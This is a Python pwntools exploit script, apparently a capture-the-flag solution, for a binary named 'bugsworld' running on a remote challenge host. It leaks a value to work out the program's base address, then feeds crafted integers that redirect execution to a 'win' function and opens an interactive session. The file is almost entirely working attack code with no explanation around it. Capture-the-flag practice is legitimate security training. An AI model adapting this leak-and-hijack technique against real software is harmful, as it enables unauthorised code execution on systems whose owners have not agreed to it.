#!/usr/bin/python3

from pwn import *

exe = ELF('bugsworld', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*run_program+586

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.pwnoh.io', 13382)
else:
        p = process(exe.path)

GDB()
sla(b'> ', str(1))
sla(b'> ', str(233))
exe.address = u64(p.recvuntil(b'Invalid', drop=True).ljust(8, b'\0'))-0x12a0
log.info("exe base: " + hex(exe.address))
log.info("win: " + hex(exe.sym.win))


sla(b'> ', str(10))
sla(b'> ', str(233))
sl(str(0))
sl(str(0))
sl(str(0))
sl(str(0))
sl(str(0))
sl(str(0))
sl(str(0))
sl(str(0x21))
sl(str(exe.sym.win))

sla(b'> ', str(1))
sla(b'> ', str(10))
p.interactive()
